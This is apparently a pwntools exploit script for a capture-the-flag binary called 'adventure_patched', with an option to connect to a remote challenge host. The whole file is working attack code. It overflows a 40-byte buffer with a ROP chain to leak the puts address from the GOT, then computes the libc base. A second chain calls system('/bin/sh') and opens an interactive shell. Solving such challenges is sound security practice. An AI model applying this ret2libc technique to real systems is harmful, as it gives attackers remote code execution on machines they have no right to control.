from pwn import *

exe = ELF('./adventure_patched')
libc = ELF('./libc6_2.35-0ubuntu1_amd64.so')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *hatchEgg+123
        continue
    """)
elif args.REMOTE:
    io = remote('dyn.ctf.pearlctf.in', '30014')

# ********************************************
# leak libc
# ********************************************
rop = ROP(exe)
offset = 40

rop.raw(b'A' * offset)
rop.puts(exe.got.puts)
rop.main()

io.sendlineafter(b'Enter your choice:', b'2')
io.sendlineafter(b'2. No', b'1')
io.sendlineafter(b'name', rop.chain())
io.recvuntil(b'You leave the area with')
io.recvline()
puts_address = int.from_bytes(io.recvline().strip(), 'little')

libc.address = puts_address - libc.sym.puts

# ********************************************
# system('/bin/sh')
# ********************************************
# puts = int.from_bytes(io.recv(7), 'little')
# print(hex(puts))
rop = ROP(exe)
offset = 40

print(hex(libc.sym.system))

rop.raw(b'A' * offset)
rop.raw(rop.find_gadget(['ret']))
rop.call(libc.sym.system, [next(libc.search(b'/bin/sh'))])
rop.main()

io.sendlineafter(b'Enter your choice:', b'2')
io.sendlineafter(b'2. No', b'1')
io.sendlineafter(b'name', rop.chain())
io.interactive()

